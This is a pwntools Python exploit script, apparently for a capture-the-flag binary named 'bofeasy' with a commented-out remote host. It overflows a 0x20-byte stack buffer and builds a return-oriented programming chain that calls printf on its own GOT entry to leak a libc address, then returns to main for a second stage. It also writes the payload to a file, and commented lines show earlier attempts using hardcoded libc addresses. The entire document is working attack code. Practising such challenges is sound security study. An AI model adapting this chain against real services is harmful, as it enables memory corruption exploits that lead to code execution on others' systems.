from pwn import *
e = ELF('./bofeasy')
libc = ELF('./libc.so.6')
#r = remote('simplebufferoverflow.fly.dev', 5000)
#r = gdb.debug('./bofeasy','break printf')
#r = gdb.debug('./bofeasy','break *main+119')
r = process('./bofeasy')
#gdb.attach(r,'break main')

pop_rdi = 0x000000000040117e
ret_gadget = 0x000000000040101a
printf_plt = e.plt['printf']
printf_got = e.got['printf']
payload = b'@' * (0x20 + 8) + p64(pop_rdi) + p64(printf_got) + p64(ret_gadget)*1 + p64(printf_plt) + p64(ret_gadget) + p64(e.symbols['main'])
#payload = b'a' * (0x20 + 8) + p64(pop_rdi) + p64(0x7ffff7f56698) + p64(ret_gadget) + p64(0x7ffff7dced60)
#payload = b'a' * (0x20 + 8) + 
with open('payload','wb') as f:
    f.write(payload+b'\n')
r.sendlineafter(b'Feed me: ', payload)
r.interactive()
